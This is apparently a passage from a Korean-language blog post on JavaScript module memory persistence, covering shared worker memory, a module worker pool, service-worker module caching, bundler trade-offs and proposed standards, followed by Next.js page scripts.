<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 메인 스레드</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">const</span> sharedBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SharedArrayBuffer</span><span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1MB</span>
</span><span class="code-line line-number" line="3"><span class="token keyword">const</span> sharedArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int32Array</span><span class="token punctuation">(</span>sharedBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// 여러 워커에 동일한 버퍼 전달</span>
</span><span class="code-line line-number" line="6">worker1<span class="token punctuation">.</span><span class="token method function property-access">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">buffer</span><span class="token operator">:</span> sharedBuffer <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="7">worker2<span class="token punctuation">.</span><span class="token method function property-access">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">buffer</span><span class="token operator">:</span> sharedBuffer <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8">
</span><span class="code-line line-number" line="9"><span class="token comment">// worker.js</span>
</span><span class="code-line line-number" line="10">self<span class="token punctuation">.</span><span class="token method-variable function-variable method function property-access">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="11">  <span class="token keyword">const</span> sharedArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Int32Array</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token property-access">data</span><span class="token punctuation">.</span><span class="token property-access">buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12">  <span class="token comment">// 모든 워커가 동일한 메모리 공간 접근</span>
</span><span class="code-line line-number" line="13">  
</span><span class="code-line line-number" line="14">  <span class="token comment">// ⚠️ 동기화 필요!</span>
</span><span class="code-line line-number" line="15">  <span class="token maybe-class-name">Atomics</span><span class="token punctuation">.</span><span class="token method function property-access">add</span><span class="token punctuation">(</span>sharedArray<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 원자적 연산</span>
</span><span class="code-line line-number" line="16"><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span></code></pre></div></div>
<h4 id="-실전-활용-패턴-모듈-풀pool-관리">🚀 실전 활용 패턴: 모듈 풀(Pool) 관리</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">class</span> <span class="token class-name">ModuleWorkerPool</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="2">  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">workerPath<span class="token punctuation">,</span> poolSize <span class="token operator">=</span> <span class="token number">4</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">workers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">queue</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="5">    
</span><span class="code-line line-number" line="6">    <span class="token comment">// 워커 풀 생성</span>
</span><span class="code-line line-number" line="7">    <span class="token keyword control-flow">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> poolSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="8">      <span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>workerPath<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="9">      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">workers</span><span class="token punctuation">.</span><span class="token method function property-access">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> worker<span class="token punctuation">,</span> <span class="token literal-property property">busy</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="10">    <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="11">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="12">  
</span><span class="code-line line-number" line="13">  <span class="token keyword">async</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="14">    <span class="token comment">// 사용 가능한 워커 찾기</span>
</span><span class="code-line line-number" line="15">    <span class="token keyword">let</span> availableWorker <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">workers</span><span class="token punctuation">.</span><span class="token method function property-access">find</span><span class="token punctuation">(</span><span class="token parameter">w</span> <span class="token arrow operator">=&gt;</span> <span class="token operator">!</span>w<span class="token punctuation">.</span><span class="token property-access">busy</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="16">    
</span><span class="code-line line-number" line="17">    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>availableWorker<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="18">      <span class="token comment">// 모든 워커가 바쁘면 대기</span>
</span><span class="code-line line-number" line="19">      <span class="token keyword control-flow">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="20">        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">queue</span><span class="token punctuation">.</span><span class="token method function property-access">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> data<span class="token punctuation">,</span> resolve <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="21">      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="22">    <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="23">    
</span><span class="code-line line-number" line="24">    availableWorker<span class="token punctuation">.</span><span class="token property-access">busy</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="25">    <span class="token comment">// 워커 실행 및 결과 반환</span>
</span><span class="code-line line-number" line="26">    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword control-flow">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token method function property-access">runWorker</span><span class="token punctuation">(</span>availableWorker<span class="token punctuation">.</span><span class="token property-access">worker</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="27">    availableWorker<span class="token punctuation">.</span><span class="token property-access">busy</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="28">    
</span><span class="code-line line-number" line="29">    <span class="token comment">// 대기 중인 작업 처리</span>
</span><span class="code-line line-number" line="30">    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">queue</span><span class="token punctuation">.</span><span class="token property-access">length</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="31">      <span class="token keyword">const</span> <span class="token punctuation">{</span> data<span class="token punctuation">,</span> resolve <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">queue</span><span class="token punctuation">.</span><span class="token method function property-access">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="32">      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token method function property-access">execute</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="33">    <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="34">    
</span><span class="code-line line-number" line="35">    <span class="token keyword control-flow">return</span> result<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="36">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="37">  
</span><span class="code-line line-number" line="38">  <span class="token function">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="39">    <span class="token comment">// 모든 워커 종료 = 모든 모듈 메모리 해제</span>
</span><span class="code-line line-number" line="40">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">workers</span><span class="token punctuation">.</span><span class="token method function property-access">forEach</span><span class="token punctuation">(</span><span class="token parameter">w</span> <span class="token arrow operator">=&gt;</span> w<span class="token punctuation">.</span><span class="token property-access">worker</span><span class="token punctuation">.</span><span class="token method function property-access">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="41">    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">workers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="42">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="43"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="44">
</span><span class="code-line line-number" line="45"><span class="token comment">// 사용 예</span>
</span><span class="code-line line-number" line="46"><span class="token keyword">const</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModuleWorkerPool</span><span class="token punctuation">(</span><span class="token string">&#x27;./processor-worker.js&#x27;</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="47"><span class="token keyword control-flow">await</span> pool<span class="token punctuation">.</span><span class="token method function property-access">execute</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="48"><span class="token comment">// 작업 완료 후</span>
</span><span class="code-line line-number" line="49">pool<span class="token punctuation">.</span><span class="token method function property-access">terminate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 모든 워커의 모듈 메모리 해제</span>
</span></code></pre></div></div>
<h3 id="서비스-워커와-모듈-캐싱">서비스 워커와 모듈 캐싱</h3>
<p>서비스 워커의 ES 모듈(Chrome 91+)은 생명주기 이벤트에 걸쳐 지속됩니다. 모듈 업데이트는 <code>importScripts</code> 동작과 유사한 표준 서비스 워커 업데이트 흐름을 트리거합니다. Cache API 통합은 모듈 캐싱 전략에 대한 세밀한 제어를 허용합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 모듈 지원이 있는 서비스 워커</span>
</span><span class="code-line line-number" line="2"><span class="token dom variable">navigator</span><span class="token punctuation">.</span><span class="token property-access">serviceWorker</span><span class="token punctuation">.</span><span class="token method function property-access">register</span><span class="token punctuation">(</span><span class="token string">&#x27;/sw.js&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3">
</span><span class="code-line line-number" line="4"><span class="token comment">// sw.js에서</span>
</span><span class="code-line line-number" line="5"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> handleFetch <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./sw-handlers.js&#x27;</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6">self<span class="token punctuation">.</span><span class="token method function property-access">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#x27;fetch&#x27;</span><span class="token punctuation">,</span> handleFetch<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre></div></div>
<p>서비스 워커의 정적 import는 모듈 내용이 변경될 때 업데이트를 트리거하여 일관성을 보장합니다. 하지만 동적 import는 현재 사양 제한으로 인해 지원되지 않습니다.</p>
<h3 id="모듈-메모리-관리의-성능-영향">모듈 메모리 관리의 성능 영향</h3>
<p>모듈 그래프 크기는 메모리 오버헤드에 직접 영향을 미칩니다. 번들러 비교에서 <strong>esbuild</strong>는 가장 낮은 메모리 사용량으로 10-100배 빠른 빌드를 달성하는 반면, <strong>Rollup</strong>은 적당한 속도로 우수한 tree shaking을 제공합니다. <strong>Webpack</strong>은 적절한 구성으로 좋은 최적화를 제공하지만 더 높은 메모리 오버헤드를 가집니다.</p>
<p>ES6 모듈로 tree shaking하면 정적 분석을 통해 20-50% 번들 크기 감소가 가능합니다. 동적 import를 통한 코드 분할은 최적화를 위한 자연스러운 분할점을 만듭니다. Webpack의 ModuleConcatenationPlugin(스코프 호이스팅)은 모듈을 결합하여 래퍼 함수 오버헤드를 줄입니다.</p>
<p>런타임 성능은 메모리 사용량과 트레이드오프됩니다. ES6 모듈은 라이브 바인딩을 통해 더 나은 메모리 효율성을 제공하지만 속성 접근에 약간의 오버헤드가 있습니다. CommonJS는 더 빠른 <code>require()</code> 호출을 제공하지만 값 복사로 인한 더 높은 메모리 사용량이 있습니다. 모듈 사전 로딩은 선행 메모리 할당 비용으로 런타임 성능을 향상시킵니다.</p>
<h2 id="새로운-표준과-미래-방향">새로운 표준과 미래 방향</h2>
<p><strong>모듈 블록 제안</strong>(TC39 Stage 1)은 워커 시나리오에서 더 나은 메모리 관리를 약속합니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">const</span> moduleBlock <span class="token operator">=</span> module <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="2">  <span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="3">    <span class="token comment">// 워커 코드 인라인</span>
</span><span class="code-line line-number" line="4">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="5"><span class="token punctuation">}</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6"><span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span>moduleBlock<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#x27;module&#x27;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre></div></div>
<p>모듈 블록은 구조적으로 복제 가능하여 Blob URL 오버헤드 없이 컨텍스트 간의 효율적인 메모리 공유를 가능하게 합니다.</p>
<p><strong>WasmGC</strong>(Chrome 91+)는 WebAssembly 모듈이 JavaScript 가비지 컬렉션에 참여할 수 있게 하여 이중 GC 오버헤드와 메모리 단편화를 제거합니다. 이는 가비지 컬렉션 언어의 WebAssembly 포트에 대해 20-40% 메모리 감소를 제공합니다.</p>
<p><strong>모듈 선언 제안</strong>은 정적 분석을 통한 더 나은 tree shaking과 번들러 복잡성 감소로 번들 친화적 구문을 제공합니다. 이러한 새로운 표준은 모듈 메모리 관리의 미래 개선을 시사하지만, 현재 제약은 장시간 실행 애플리케이션에서 여전히 도전적입니다.</p>
<h2 id="결론">결론</h2>
<p>JavaScript 모듈 메모리 지속성은 버그가 아닌 근본적인 아키텍처 제약을 나타냅니다. 모듈은 import 간에 상태를 유지하는 영구적인 싱글톤 엔티티로 설계되었습니다. 이 연구는 모듈 기반 애플리케이션에서 효과적인 메모리 관리가 모듈 자체를 언로드하려는 시도보다는 모듈 내용에 대한 신중한 주의를 필요로 함을 보여줍니다.</p>
<p>프로덕션 애플리케이션의 경우:</p>
<ul>
<li>모듈 리소스에 대한 명시적 생명주기 관리 구현</li>
<li>적절한 가비지 컬렉션 자격을 위해 WeakMap/WeakSet 사용</li>
<li>큰 데이터에 대해 JSON import보다 fetch() 선호</li>
<li>장시간 실행 애플리케이션에서 메모리 증가 모니터링</li>
<li>모듈이 영구히 지속된다는 이해로 설계</li>
</ul>
<p>미래는 새로운 표준을 통한 개선을 약속하지만, 현재 애플리케이션은 최적의 메모리 효율성을 달성하기 위해 기존 제약 내에서 작업해야 합니다.</p>
<h2 id="참고-문헌">참고 문헌</h2>
<ul>
<li><a href="https://hacks.mozilla.org/2018/03/es-modules-a-cartoon-deep-dive/">ES modules: A cartoon deep-dive – Mozilla Hacks</a></li>
<li><a href="https://v8.dev/features/modules">JavaScript modules - V8</a></li>
<li><a href="https://exploringjs.com/es6/ch_modules.html">Modules - Exploring ES6</a></li>
<li><a href="https://esdiscuss.org/topic/are-es-modules-garbage-collected-if-so-do-they-re-execute-on-next-import">Are ES Modules garbage collected? If so, do they re-execute on next import? - ESDiscuss</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Memory_management">Memory management - JavaScript | MDN</a></li>
<li><a href="https://firefox-source-docs.mozilla.org/js/gc.html">SpiderMonkey garbage collector - Mozilla</a></li>
<li><a href="https://deepu.tech/memory-management-in-v8/">Visualizing memory management in V8 Engine - Technorage</a></li>
<li><a href="https://dev.to/jennieji/memory-management-in-v8-garbage-collection-and-improvements-18e6">Memory Management in V8, garbage collection and improvements - DEV Community</a></li>
<li><a href="https://blog.risingstack.com/node-js-at-scale-node-js-garbage-collection/">Node.js Garbage Collection Explained - RisingStack</a></li>
<li><a href="https://webpack.js.org/concepts/hot-module-replacement/">Hot Module Replacement | webpack</a></li>
<li><a href="https://webpack.js.org/concepts/module-federation/">Module Federation | webpack</a></li>
<li><a href="https://web.dev/articles/es-modules-in-sw/">ES modules in service workers | web.dev</a></li>
<li><a href="https://web.dev/articles/module-workers">Threading the web with module workers | web.dev</a></li>
<li><a href="https://javascript.info/garbage-collection">Garbage collection - JavaScript.info</a></li>
<li><a href="https://auth0.com/blog/four-types-of-leaks-in-your-javascript-code-and-how-to-get-rid-of-them/">4 Types of Memory Leaks in JavaScript and How to Get Rid Of Them - Auth0</a></li>
<li><a href="https://stackoverflow.com/questions/71684556/how-to-unload-dynamic-imports-in-javascript">How to unload dynamic imports in javascript? - Stack Overflow</a></li>
<li><a href="https://stackoverflow.com/questions/37620697/is-nodes-require-cache-garbage-collected">Is Node&#x27;s require cache garbage collected? - Stack Overflow</a></li>
<li><a href="https://webpack.js.org/guides/tree-shaking/">Tree Shaking | webpack</a></li>
<li><a href="https://developer.chrome.com/blog/wasmgc">WebAssembly Garbage Collection (WasmGC) - Chrome Developers</a></li>
<li><a href="https://github.com/tc39/proposal-module-declarations">GitHub - tc39/proposal-module-declarations</a></li>
<li><a href="https://github.com/tc39/proposal-module-expressions">GitHub - tc39/proposal-module-expressions</a></li>
</ul></div></article></div><!--$--><!--/$--><!--$--><!--/$--></div></main><footer class="border-t py-8 md:py-12"><div class="container max-w-4xl mx-auto px-4"><div class="flex flex-col items-center justify-center space-y-4 text-center"><div class="flex items-center space-x-4 text-sm"><a href="/rss.xml" class="text-muted-foreground hover:text-primary transition-colors" target="_blank" rel="noopener noreferrer">RSS</a><span class="text-muted-foreground">•</span><a href="/feed.json" class="text-muted-foreground hover:text-primary transition-colors" target="_blank" rel="noopener noreferrer">JSON Feed</a></div><p class="text-sm text-muted-foreground">© 2025.06 ~ <!-- -->2025<!-- -->.<!-- -->9<!-- --> Blog</p></div></div></footer></div><script src="/_next/static/chunks/webpack-56d9518731895b2c.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[61483,[\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9318\",\"static/chunks/9318-87923cfcfd0d5659.js\",\"7177\",\"static/chunks/app/layout-cc2413b4ac7fd51b.js\"],\"ThemeProvider\"]\n3:I[12708,[\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9318\",\"static/chunks/9318-87923cfcfd0d5659.js\",\"7177\",\"static/chunks/app/layout-cc2413b4ac7fd51b.js\"],\"Analytics\"]\n4:I[12708,[\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9318\",\"static/chunks/9318-87923cfcfd0d5659.js\",\"7177\",\"static/chunks/app/layout-cc2413b4ac7fd51b.js\"],\"GoogleAds\"]\n5:I[6874,[\"6249\",\"static/chunks/cb15b0f3-4f54b17909709afc.js\",\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9522\",\"static/chunks/9522-efe1b27bdbdfccd2.js\",\"6156\",\"static/chunks/app/posts/%5B...slug%5D/page-533962adf6041fb8.js\"],\"\"]\n6:I[66688,[\"6874\",\"static/chunks/6874-fa507aafc07af06a.js\",\"9318\",\"static/chunks/9318-87923cfcfd0d5659.js\",\"7177\",\"static/chunks/app/layout-cc2413b4ac7fd51b.js\"],\"ThemeToggle\"]\n7:I[87555,[],\"\"]\n8:I[31295,[],\"\"]\na:I[59665,[],\"MetadataBoundary\"]\nc:I[59665,[],\"OutletBoundary\"]\nf:I[74911,[],\"AsyncMetadataOutlet\"]\n11:I[59665,[],\"ViewportBoundary\"]\n13:I[26614,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/c980a1f40926c6e4.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"asoDXITN20baZVC-MYoBd\",\"p\":\"\",\"c\":[\"\",\"posts\",\"technology\",\"2025-09-11-javascript-module-persistent-browser-memory\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"posts\",{\"children\":[[\"slug\",\"technology/2025-09-11-javascript-module-persistent-browser-memory\",\"c\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/c980a1f40926c6e4.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"ko\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_f367f3 antialiased min-h-screen\",\"children\":[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[\"$\",\"div\",null,{\"className\":\"flex min-h-screen flex-col\",\"children\":[[\"$\",\"$L3\",null,{}],[\"$\",\"$L4\",null,{}],[\"$\",\"header\",null,{\"className\":\"sticky top-0 z-50 w-full border-b bg-background/80 backdrop-blur supports-[backdrop-filter]:bg-background/80\",\"children\":[\"$\",\"div\",null,{\"className\":\"container max-w-4xl mx-auto flex h-16 items-center justify-between px-4\",\"children\":[[\"$\",\"$L5\",null,{\"href\":\"/\",\"className\":\"flex items-center space-x-2 text-xl font-semibold transition-colors hover:text-primary\",\"children\":[[\"$\",\"svg\",null,{\"ref\":\"$undefined\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":24,\"height\":24,\"viewBox\":\"0 0 24 24\",\"fill\":\"none\",\"stroke\":\"currentColor\",\"strokeWidth\":2,\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"lucide lucide-file-text h-6 w-6 text-primary\",\"aria-hidden\":\"true\",\"children\":[[\"$\",\"path\",\"1rqfz7\",{\"d\":\"M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z\"}],[\"$\",\"path\",\"tnqrlb\",{\"d\":\"M14 2v4a2 2 0 0 0 2 2h4\"}],[\"$\",\"path\",\"b1mrlr\",{\"d\":\"M10 9H8\"}],[\"$\",\"path\",\"t4e002\",{\"d\":\"M16 13H8\"}],[\"$\",\"path\",\"z1uh3a\",{\"d\":\"M16 17H8\"}],\"$undefined\"]}],[\"$\",\"span\",null,{\"children\":\"Blog\"}]]}],[\"$\",\"div\",null,{\"className\":\"flex items-center space-x-6\",\"children\":[[\"$\",\"nav\",null,{\"className\":\"flex items-center space-x-6\",\"children\":[[\"$\",\"$L5\",null,{\"href\":\"/\",\"className\":\"text-sm font-medium text-muted-foreground transition-colors hover:text-foreground\",\"children\":\"홈\"}],[\"$\",\"$L5\",null,{\"href\":\"/tags\",\"className\":\"text-sm font-medium text-muted-foreground transition-colors hover:text-foreground\",\"children\":\"태그\"}],[\"$\",\"$L5\",null,{\"href\":\"/about\",\"className\":\"text-sm font-medium text-muted-foreground transition-colors 